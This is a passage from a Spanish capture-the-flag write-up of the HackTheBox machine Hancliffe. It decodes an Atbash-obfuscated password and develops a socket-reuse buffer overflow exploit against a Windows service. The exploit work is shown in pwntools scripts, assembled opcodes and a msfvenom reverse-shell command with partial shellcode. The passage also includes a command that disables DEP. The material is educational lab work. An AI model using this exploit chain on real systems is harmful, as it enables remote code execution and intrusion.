176   126   7E    ~
177   127   7F    DEL
```

Por tanto este condicional se encarga de comprobar si el caracter por el que se está iterando es un símbolo y en caso de que lo sea, se le va a asignar el valor del caracter a la posición que corresponda en la contraseña modificada en rot47, que es como si se dejara igual. En caso contrario, comprueba que el caracter es menor que 91, es decir, letras mayúsculas, por que los simbolos están restringidos en la anterior condición.

```null
101   65    41    A
102   66    42    B
103   67    43    C
104   68    44    D
105   69    45    E
106   70    46    F
107   71    47    G
110   72    48    H
111   73    49    I
112   74    4A    J
113   75    4B    K
114   76    4C    L
115   77    4D    M
116   78    4E    N
117   79    4F    O
120   80    50    P
121   81    51    Q
122   82    52    R
123   83    53    S
124   84    54    T
125   85    55    U
126   86    56    V
127   87    57    W
130   88    58    X
131   89    59    Y
132   90    5A    Z
```

Se está definiendo un estado booleano, que en caso de que sea true, se le va a sumar 32 al caracter, que corresponde a tranformarlo a minúscula

```null
 python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> chr(ord("A") + 0x20)
'a'
```

En la última condición se vuelve a transformar en mayúsculas

Por cada caracter le está sumando 159 unidades y a 122 le está restando la suma anteriormente calculada. Esto corresponde a restarle 37 unidades al inverso del caracter. Tomándolo como signed byte, se escaparía del rango de valores para la tabla ASCII, por lo que si lo considero como unsigned byte, tendría que sumarle 256 unidades y estaría en el rango de 0 a 255. Teniendo en cuenta que el caracter más pequeño que puede recibir es una "a" minúscula, cuyo valor en decimal es 97, si calculo la operatoria anteriormente definida, obtengo justamente el último valor posible, una "z" minúscula.

```null
>>> chr(-ord("a") + 256 - 37)
'z'
```

A este método de cifrado se le conoce como Atbash y es el nombre que le asigno a la función que tiene este aspecto:

<img src="/writeups/assets/img/Hancliffe-htb/30.png" alt="">

Ahora en CyberChef, añado Atbash como nuevo método de cifrado y obtengo la contraseña en texto claro

<img src="/writeups/assets/img/Hancliffe-htb/31.png" alt="">

Pruebo a autenticarme con netcat utilizando esa contraseña y el usuario que tenía anteriormente

```null
nc 10.10.11.115 9999
Welcome Brankas Application.
Username: alfiansyah
Password: K3r4j@@nM4j@pAh!T
Login Successfully!
FullName: 
```

La credencial es correcta y ahora tengo acceso a otro campo donde puedo introducir un nuevo input

Desde el Ghidra busco referencias a la función del login y encuentro la continuación del programa

<img src="/writeups/assets/img/Hancliffe-htb/32.png" alt="">

<img src="/writeups/assets/img/Hancliffe-htb/33.png" alt="">

Mas adelante se puede ver un usuario y un código

<img src="/writeups/assets/img/Hancliffe-htb/34.png" alt="">

Pruebo esos datos en los siguientes campos

```null
nc 10.10.11.115 9999
Welcome Brankas Application.
Username: alfiansyah
Password: K3r4j@@nM4j@pAh!T
Login Successfully!
FullName: Vickry Alfiansyah
Input Your Code: T3D83CbJkl1299
Unlocked
```

El programa termina con un código de estado exitoso, pero de momento no me sirve de nada

En el código hay una funcion _SaveCreds(), que se le pasan dos argumentos y como antes pide como input en nombre y el código, quiero pensar que esos son los valores que se le proporcionan

<img src="/writeups/assets/img/Hancliffe-htb/35.png" alt="">

La abro para ver en que consiste

<img src="/writeups/assets/img/Hancliffe-htb/36.png" alt="">

Se está definiendo una variable local_42 a la cual se le están asignando 50 bytes de tamaño, como param_1 y param_2 sé lo que valen y con _strcpy se los está copiando a las variables que define arriba, podría tratar forzarlo metiendo una cantidad inesperada de datos para que el programa se corrompa y se efectúe un buffer overflow, del que me puedo aprovechar una vez tenga el control del EIP.

Me conecto por netcat al servicio y en el input code le meto muchas "A"

```null
nc 10.10.11.115 9999
Welcome Brankas Application.
Username: alfiansyah
Password: K3r4j@@nM4j@pAh!T
Login Successfully!
FullName: Vickry Alfiansyah
Input Your Code: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

El programa se cierra y si trato de volverme a conectar el servicio no está disponible. No pasa nada porque hay una tarea ACR que se encarga de restablecerlo

```null
*Evil-WinRM* PS C:\DevApp> type restart.ps1
# Restart app every 3 mins to avoid crashes
while($true) {
  # Delete existing forwards
  cmd /c "netsh interface portproxy delete v4tov4 listenport=9999 listenaddress=0.0.0.0"
  # Spawn app
  $proc = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ("C:\DevApp\MyFirstApp.exe")
  sleep 2
  # Get random port
  $port = (Get-NetTCPConnection -OwningProcess $proc.ProcessId).LocalPort
  # Forward port to 9999
  cmd /c "netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=$port connectaddress=127.0.0.1"
  sleep 180
  # Kill and repeat
  taskkill /f /t /im MyFirstApp.exe
```

Una vez entendido como funciona el programa, paso a arrancar mi máquina Windows para instalar el binario y debbugeralo con el x64 DBG para controlar el EIP y poder redirigir el flujo del programa y ejecutar comandos

Me comparto un servicio http con python y desde la máquina Windows me descargo el binario

<img src="/writeups/assets/img/Hancliffe-htb/37.png" alt="">

Ejecuto el programa, y desde la máquina Linux me intento conectar, pero de primeras no voy a poder

<img src="/writeups/assets/img/Hancliffe-htb/38.png" alt="">

Desde el Firewall de Windows Defender, agrego una regla que permita la entrada y salida de paquetes aunque la conexión no sea segura

Como había visto que el binario es de 32 bits, me abro el x32 DBG para aplicar debugging

```null
file MyFirstApp.exe
MyFirstApp.exe: PE32 executable (console) Intel 80386, for MS Windows
```

Una vez abierto, le doy a ejecutar tantas veces como haga falta para que cargue completamente

<img src="/writeups/assets/img/Hancliffe-htb/39.png" alt="">


Dese la máquina Linux, me conecto e introduzco muchas "A" en el campo del código, con el objetivo de que EIP valga 0x41414141 y el programa se corrompa

```null
nc 192.168.16.136 9293
Welcome Brankas Application.
Username: alfiansyah
Password: K3r4j@@nM4j@pAh!T
Login Successfully!
FullName: Vickry Alfiansyah
Input Your Code: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

En la máquina Windows puedo ver que el programa se ha cerrado, y, que efectivamente el EIP vale 41414141, que corresponde a la "A" cuatro veces en hexadecimal

<img src="/writeups/assets/img/Hancliffe-htb/40.png" alt="">

Sobre la marcha, voy creando un script en python que se encargue de enviar la data que necesito

Para empezar, importo los pwntools y defino la IP y el puerto donde se tiene que conectar el socket. Como el puerto es dinámico, lo proporciono mediante un argumento

```null
from pwn import *

port = sys.argv[1]

r = remote('10.10.11.115', port)
```

Para calcular el offset y saber cuantos caracteres tengo que enviar antes de sobrescribir el EIP, creo un patrón

```null
pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

Si se lo envío al servidor, cuando se efectúe el buffer overflow, en el registro del EIP puedo ver los valores que coinciden con alguna cadena de este payload.

Y ahora tiene el siguiente valor:

<img src="/writeups/assets/img/Hancliffe-htb/41.png" alt="">

Obtengo el offset

```null
pattern_offset.rb -l 1000 -q 41326341
[*] Exact match at offset 66
```

Agrego en el script de python los datos de tengo que enviar y recibir antes de tramitar el payload

```null
from pwn import *

port = sys.argv[1]

r = remote('192.168.16.136', port)

offset = 66
junk = b"A"*offset

payload = junk + b"B"*8


r.recvuntil(b"Username:")
r.sendline(b"alfiansyah")
r.recvuntil(b"Password")
r.sendline(b"K3r4j@@nM4j@pAh!T")
r.recvuntil(b"FullName:")
r.sendline(b"Vickry Alfiansyah")
r.recvuntil(b"Input Your Code:")
r.sendline(payload)
```

Si ejecuto el exploit, en el x32dbg puedo ver que el EIP vale 42424242

```null
python3 bof.py 9556
[+] Opening connection to 192.168.16.136 on port 9556: Done
[*] Closed connection to 192.168.16.136 port 9556
```

<img src="/writeups/assets/img/Hancliffe-htb/42.png" alt="">

Le añado al final 200 "C" para ver en donde se almacenan

```null
payload = junk + b"B"*8 + b"C"*200
```

Al hacer click derecho en el ESP, se puedo ir directamente a la pila donde están mis "C".

<img src="/writeups/assets/img/Hancliffe-htb/43.png" alt="">

Pero no están todas, la mayoría han desaparecido

<img src="/writeups/assets/img/Hancliffe-htb/44.png" alt="">

Como no tengo espacio suficiente como para insertar un shellcode y ejecutar comandos, podría tratar de aprovechar esos pocos bytes para inyectar un offocode que haga un jump al comienzo del ESP, que si tengo control de su valor. Para ello, voy a tener que efecutr un Socket Reuse. Para empezar voy a saltar a la dirección 00E0FF18, que corresponde al valor del ESP en el momento de aplicar el buffer overflow.

Para evitar problemas en el las pruebas locales que estoy haciendo en la máquina Windows, voy a desactivar el DEP, para que pueda interpretar shellcode almacenado en la pila

```null
Update:

bcdedit /set nx alwaysoff # Ejecutar este comando como Administrador para evitar futuros problemas
```

<img src="/writeups/assets/img/Hancliffe-htb/45.png" alt="">

Para encontrar el offset, tengo que encontrar una dirección proxima al push ebp, que se encarga de hacer una llamada al ESP, ya que no es estático

<img src="/writeups/assets/img/Hancliffe-htb/46.png" alt="">

En mi caso, tengo lo siguiente:

<img src="/writeups/assets/img/Hancliffe-htb/47.png" alt="">

Aplico una búsqueda recursiva en todos los módulos, para buscar por el comando que me interesa

<img src="/writeups/assets/img/Hancliffe-htb/48.png" alt="">

<img src="/writeups/assets/img/Hancliffe-htb/49.png" alt="">

Cuanto más cerca esté de la dirección 719014E0, que corresponde al push ebp, mejor

<img src="/writeups/assets/img/Hancliffe-htb/50.png" alt="">

Ahora en el payload, más que introducir las "B" y las "C", voy a cargarle esa dirección que hace un opcode al ESP, pero tranformándola antes a little endian

```null
payload = junk + jmp_esp
jmp_esp = p32(0x7190239F)
```

Desde la refencia de la dirección a la cual quiero llegar, presiono la tecla F2 para agregar un breakpoint y que el programa se detenga temporalmente

<img src="/writeups/assets/img/Hancliffe-htb/51.png" alt="">

Ahora el flujo del programa se ha detenido en la dirección esperada

<img src="/writeups/assets/img/Hancliffe-htb/52.png" alt="">

Si cargo la siguiente instrucción el ESP vale 0252FF18

<img src="/writeups/assets/img/Hancliffe-htb/53.png" alt="">

<img src="/writeups/assets/img/Hancliffe-htb/54.png" alt="">

Y si me voy a la siguiente instrucción EIP vale lo mismo que valía ESP

<img src="/writeups/assets/img/Hancliffe-htb/55.png" alt="">

Ahora me encuentro en esa dirección, pero la idea es regresar unas cuantas hacia atrás para poder reutilizar el espacio que actualmente está siendo ocupado por "A"

<img src="/writeups/assets/img/Hancliffe-htb/56.png" alt="">

Para poder desplazar el EIP a otra sección, tengo que considerar que como mi offset es de 66 bytes y el EIP ocupa otros 4, en total hay 70 bytes. Para poder apuntar al comienzo, tendría que restarle esa cantidad y apuntar a un opcode que me permita realizar esa operatoria

```null
nasm_shell.rb
nasm > jmp $-70
00000000  EBB8              jmp short 0xffffffba
```

```null
rest_esp = b"\xEB\xB8"
payload = junk + jmp_esp + rest_esp
```

En mi payload, agrego esa dirección en formato bytes y vuelvo a ejecutar, el programa se detiene de nueve en el breakpoint y si continúo se aplica el opcode al ESP, que a su vez tiene el mismo valor que EIP

Aplica un jump al esp gracias a que se interpreta el opcode

<img src="/writeups/assets/img/Hancliffe-htb/57.png" alt="">

Si doy otro paso hacia adelante, el EIP cambia su valor a la anterior del ESP

<img src="/writeups/assets/img/Hancliffe-htb/63.png" alt="">

<img src="/writeups/assets/img/Hancliffe-htb/64.png" alt="">

Finalmente, obtengo resultados, aunque sigue siendo muy poco tamaño, pero de haber empezado con 10 bytes a tener ahora 60, el margen de maniobra a aumentado drásticamente. Para ello, puedo aprovecharme de alguna función donde almacenar los datos de forma temporal. Primer objetivo cumpliodo, dejar al EIP apuntando al principio del ESP

<img src="/writeups/assets/img/Hancliffe-htb/58.png" alt="">

Vuelvo a retocar el script en python para agregarle una cadena que quiero que se introduzca al principio del ESP, para ello tengo que restarle al junk su longitud, ya que si no sobrescribiría de nuevo EIP y nada cobraría sentido

```null
test = b""
test += b"\xca\xde\xaa"

offset = 66 - len(test)
junk = test + b"A"*offset

jmp_esp = p32(0x7190239F)
jmp_esp70 = b"\xEB\xB8"
payload = junk + jmp_esp + jmp_esp70 + test
```

Ejecuto y, efectivamente, aquellos caracteres que envíe antes de sobrescribir el EIP, voy a poder apuntar a ellos directamente al comienzo del ESP y como el Data Execution Prevention está desabilitado, podré ejecutar shellcode. Pero en 60 bytes no, porque sigue siendo muy poco espacio

<img src="/writeups/assets/img/Hancliffe-htb/65.png" alt="">

Desde Ghidra, en la las referencias a la función login se puede ver una llamada a recv()

<img src="/writeups/assets/img/Hancliffe-htb/59.png" alt="">

Si vuelvo a efectuar el buffer overflow y miro lo que hay arriba del valor del EIP, estoy bastante cerca del input que introduzco a través del socket

<img src="/writeups/assets/img/Hancliffe-htb/60.png" alt="">

Hasta que, finalmente, llego a una información un poco más descriptiva. En el código en ensamblador, se puede ver como se abren y cierran sockets

<img src="/writeups/assets/img/Hancliffe-htb/60.png" alt="">

Dentro de la llamada al EAX que se ejecuta justo de recibir la data por el socket, agrego un breakpoint, y puedo ver los siguientes datos que corresponden al descriptor del socket, la dirección del buffer y su tamaño, que corresponde a la función recv() que se ve desde el Ghidra

<img src="/writeups/assets/img/Hancliffe-htb/66.png" alt="">

<img src="/writeups/assets/img/Hancliffe-htb/61.png" alt="">

La sintaxis básica en c, consiste en lo siguiente, según [Microsoft](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv):

```c
int recv(
  [in]  SOCKET s,
  [out] char   *buf,
  [in]  int    len,
  [in]  int    flags
);
``` 

Como tiene 400 bytes de espacio, si pudiera reutizarlos para almacenar shellcode podría ganar acceso al sistema. Para ello, tengo que almacenar estos valores en algún lugar de la pila para posteriormente pushearlos, popearlos y enviarlos en el orden adecuado.

El mismo valor que se le estaba pasando como registro al socket, está reflejado en la pila y está bastante próximo a la dirección de ESP. Necesito saber cual es la diferencia entre esos dos registros para así poder mover el valor a otro temporal, como puede ser EAX

<img src="/writeups/assets/img/Hancliffe-htb/67.png" alt="">

```null
python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x60 - 0x18)
'0x48'
```

Así que si yo a la dirección del ESP le sumo el valor que acabo de calcular en hexadecimal, llegaría al registro del que quiero extraer el valor. Ahora es cuando hago el push del ESP para ponerlo en la parte superior de la pila y luego al hacer un pop de EAX, ese mismo valor lo va a coger, almacenarlo y desaparece del stack.

Para definir instrucciones instrucciones en ensamblador, voy a utilizar msf-metasm_shell

En el script en python, donde tenía almacenada la variable test, le cambio el nombre para que pase a llamarse recvcall, que es donde voy a almacenar el registro de forma temporal. Le añado por un lado, push a ESP para crear la copia y un pop a EAX para extraerlo

```null
msf-metasm_shell
type "exit" or "quit" to quit
use ";" or "\n" for newline
type "file <file>" to parse a GAS assembler source file

metasm > push esp
"\x54"
metasm > pop eax
"\x58"
```

Y modifico el script de python

```null
recvcall = b""
recvcall += b"\x54"
recvcall += b"\x58"

offset = 66 - len(test)
junk = b"A"*offset

jmp_esp = p32(0x7190239F)
jmp_esp70 = b"\xEB\xB8"
payload = recvcall + junk + jmp_esp + jmp_esp70
```

Vuelvo a ejecutar y desde el debbuger paso por el breakpoint del EAX y me quedo en el ESP y al ver el comienzo del stack, me aseguro de que los dos comandos en ensamblador se ejecutan correctamente

<img src="/writeups/assets/img/Hancliffe-htb/68.png" alt="">

Si voy al siguiente paso el valor del registro pasa al comienzo de la pila

<img src="/writeups/assets/img/Hancliffe-htb/69.png" alt="">

Y en el siguiente se copia a EAX

<img src="/writeups/assets/img/Hancliffe-htb/70.png" alt="">

Teniendo ya almacenado el descriptor de archivos del socket, paso a almacenar los otros valores en otros registros como ESI. Como ya tengo el registro almacenado en EAX y ya había calculado que tenía que sumarle 0x48 para llegar a 0259FF60. Para evitar tener que operar con el ESP, que ha fin de cuentas depende del valor del EIP porque estoy efectuando un buffer overflow, podría tratar de introduccir instrucciones en ensamblador que se encarguen de calcular y asignar los valores de los registros del socket a otro cualquiera, como puede ser ESI o EDI.

La forma de sumar cantidades al registro EAX sería la siguiente:

```null
metasm > add ax, 0x48
"\x66\x05\x48\x00"
```

Pero tengo un problema, y es que al final aparece un null byte y suele corromper inmediatamente el programa. Si en vez de sumarle 0x48, le sumo otro valor, como 0x101, el null byte desaparece

```null
metasm > add ax, 0x101
"\x66\x05\x01\x01"
```

Para solucionar este problema, podría tratar de calcular la diferencia para restarselo a la cantidad anterior

```null
python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x190 - 0x48)
'0x148'
```

Si ahora calculo la resta en ensamblador, ya no tengo ese problema

```null
metasm > add ax, 0x190
"\x66\x05\x90\x01"
metasm > sub ax, 0x148
"\x66\x2d\x48\x01"
```

Esto es lo mismo que sumar 0x48 directamente, pero de una manera que lo interprete. Añado al script de python estos valores en la variable y ahora ya tengo alcance al valor del registro y solo faltaría añadirselo a ESI. Ahora no hay que repetir lo mismo de antes porque ya no es extraer un valor del stack si no copiar un registro a otro.

```null
metasm > mov esi, dword [eax]
"\x8b\x30"
```

Ejecuto y me voy al breakpoint del ESP. Parece ser que no hay ningún problema

<img src="/writeups/assets/img/Hancliffe-htb/71.png" alt="">

El principio es igual, subo al comienzo de la pila la dirección del primer registro, se lo paso a EAX para quedarme con su valor y ahora opero con los cálculos que anteriormente define para extraer el valor del otro registro y moverlo a ESI

Ya tengo el Socket File Descriptor en ESI. Ahora podría tratar de copiar el registro del tamaño, que este puede estar interesante porque de poderlo modificar puedo asignarle más bytes, que equivale a más capacidad a la hora inyectar shellcode

Según voy avanzando, me van surgiendo los problemas. Al ir recorriendo las instrucciones que estoy introducciendo en ensamblador, el EIP va bajando y se aproxima cada vez más al ESP. En caso de que se solapen, puede originar que el programa se corrompa y no llegue a mi objetivo. Para evitarlo, puedo modificar el valor del ESP de tal manera que esté siempre por encima de EIP. Con 64 bytes es suficiente.

<img src="/writeups/assets/img/Hancliffe-htb/72.png" alt="">

```null
metasm > sub esp, 0x64
"\x83\xec\x64"
```

<img src="/writeups/assets/img/Hancliffe-htb/73.png" alt="">

Al ejecutar está por debajo, pero según recorre todas las instrucciones las posiciones cambian

<img src="/writeups/assets/img/Hancliffe-htb/76.png" alt="">

Y ahora tengo todo el espacio para poder ejecutar instrucciones e ir redirigiendo el flujo del programa y añadir los otros dos registros que me falta, flags y len. Ya podría ir metiendo los valores en la pila, pero de forma inversa, para que una vez lo interprete se ejecute por orden.


El registro de Flags era todo ceros, pero si trato de añadirlo directamente, vuelvo a tener el problema del null byte

```null
metasm >push 0x0
"\x6a\x00"
```

Pero otra forma de conseguir este mismo valor sería aplicando operadores lógicos. Cuando un valor es xroreado con sigo mismo, el resultado es 0, entonces si quiero almacenar el valor del registro flag en EBX, basta con hacerle un xor a sí mismo y pushearlo. Para el registro del tamaño, le podría añadir 400 bytes a EBX y también pushearlo.

```null
metasm > xor ebx, ebx
"\x31\xdb"
metasm > push ebx
"\x53"
```

Añado esta nueva instrucción a la variable de python y ejecuto

<img src="/writeups/assets/img/Hancliffe-htb/75.png" alt="">

Solo falta agregar el registro de la longitud, como 400 bytes al transformarlo a ensamblador tiene un null byte, le añado uno más para evitar ese problema

```null
metasm > add bx, 0x400
"\x66\x81\xc3\x00\x04"
metasm > add bx, 0x401
"\x66\x81\xc3\x01\x04"
metasm > push ebx
"\x53"
```

Añado este nuevo valor a la variable de python, junto con el push

<img src="/writeups/assets/img/Hancliffe-htb/76.png" alt="">

Y ya tendría en la pila los dos valores que me interesan 0 y 401

<img src="/writeups/assets/img/Hancliffe-htb/77.png" alt="">

Solo falta agregar mi shellcode para poder entablarme la reverse shell. La idea está en que una vez se produzca la comunicación con el socket, se le va a asignar al stack un tamaño de 401 bytes, por lo que es entonces cuando tengo que introducirlo. Al no conocer la dirección en la que voy a caer, si introduzco NOPs puedo caer en un punto intermedio de la pila y de esa manera que el flujo del programa continue hasta llegar al shellcode y se interprete.

Para evitar problemas,el registro ESP no lo voy a utilizar para esto como haría en un Buffer Overflow Stack Based, ya no lo tengo que volver a utilizar, puedo tratar de almacenar en el valor de EBX para asi poder meter los NOPs en este otro registro y que no afecte a los offsets que ya están calculados

Como a ESP le había restado 64 bytes para subirlo a una direccion donde fuera imposible que se solapara con el EIP, a EBX le sumo 64 bytes para aplicar un desplazamiento de la dirección para que EBX no tenga el mismo valor que ESP y asi cuando aplico un jump al EBX caer en un punto intermedio de los NOPs, que es lo que ahora estan ocupando las "A" en el junk.

Si hago un push de ESP y luego lo popeo a EBX, puedo copiar el valor de ESP a EBX

```null
metasm > push esp
"\x54"
metasm > pop ebx
"\x5b"
metasm > add bx, 0x64
"\x66\x83\xc3\x64"
```

Compruebo que todo está funcional y no me he equivocado en nada

<img src="/writeups/assets/img/Hancliffe-htb/78.png" alt="">

<img src="/writeups/assets/img/Hancliffe-htb/79.png" alt="">

Una vez interpretado todo, los valores se han asignado correctamente y EBX se ha desplazado hacia abajo como era de esperar y podría tratar de hacer un push al EBX, que es donde se van a encontrar los NOPs y seguidamente el shellcode y al ESI, que contiene el descriptor de archivo y como he cambiado la dirección donde apunta el buffer que ahora vale lo mismo que EBX, caigo en un punto intermedio de los NOPs, inyecto un shellcode que va a ser interpretado porque el DEP está deshabilitado y gano acceso al sistema

<img src="/writeups/assets/img/Hancliffe-htb/80.png" alt="">

El orden de los registros para que todo se efectúe correctamente es muy importante

<img src="/writeups/assets/img/Hancliffe-htb/81.png" alt="">

En el último lugar tiene que estar el valor de la flag, después el tamaño asignado al buffer, la dirección y el descriptor de archivo. Si ahora hago una llamada a la función recv(), va a tomar como prioritarios los registros que están en el stack y los va a tomar como argumentos para ejecutarse.

Desde el Ghidra puedo ver la dirección para aplicar la llamada

<img src="/writeups/assets/img/Hancliffe-htb/82.png" alt="">

Muevo esa dirección al registro EAX y le aplico una llamada para que se interprete

```null
metasm > mov eax, [0x719082ac]
"\xa1\xac\x82\x90\x71"
metasm > call eax
"\xff\xd0"
```

Todo parece estar en su sitio, y la dirección que vi en Ghidra para llamar a la función es correcta, ya que detecta que la estoy pasando por referencia

<img src="/writeups/assets/img/Hancliffe-htb/83.png" alt="">

Compruebo que los argumentos de la función son correctos

<img src="/writeups/assets/img/Hancliffe-htb/84.png" alt="">

Convierto las "A" del script de python a NOPs para que el programa no se corrompa y le agrego mi shellcode indicándole que no le añada null bytes y que corra como un proceso independiente, para que en caso de que algo salga mal pueda seguir teniendo acceso al programa.

```null
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.130 LPORT=443 -b "\x00" EXITFUNC=thread -f py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1745 bytes
buf =  b""
buf += b"\xdb\xce\xd9\x74\x24\xf4\xb8\x1b\xcd\x7a\x86\x5b"
buf += b"\x33\xc9\xb1\x52\x31\x43\x17\x83\xeb\xfc\x03\x58"
buf += b"\xde\x98\x73\xa2\x08\xde\x7c\x5a\xc9\xbf\xf5\xbf"
buf += b"\xf8\xff\x62\xb4\xab\xcf\xe1\x98\x47\xbb\xa4\x08"
buf += b"\xd3\xc9\x60\x3f\x54\x67\x57\x0e\x65\xd4\xab\x11"
buf += b"\xe5\x27\xf8\xf1\xd4\xe7\x0d\xf0\x11\x15\xff\xa0"
buf += b"\xca\x51\x52\x54\x7e\x2f\x6f\xdf\xcc\xa1\xf7\x3c"
buf += b"\x84\xc0\xd6\x93\x9e\x9a\xf8\x12\x72\x97\xb0\x0c"
buf += b"\x97\x92\x0b\xa7\x63\x68\x8a\x61\xba\x91\x21\x4c"
buf += b"\x72\x60\x3b\x89\xb5\x9b\x4e\xe3\xc5\x26\x49\x30"
buf += b"\xb7\xfc\xdc\xa2\x1f\x76\x46\x0e\xa1\x5b\x11\xc5"
buf += b"\xad\x10\x55\x81\xb1\xa7\xba\xba\xce\x2c\x3d\x6c"
buf += b"\x47\x76\x1a\xa8\x03\x2c\x03\xe9\xe9\x83\x3c\xe9"
buf += b"\x51\x7b\x99\x62\x7f\x68\x90\x29\xe8\x5d\x99\xd1"
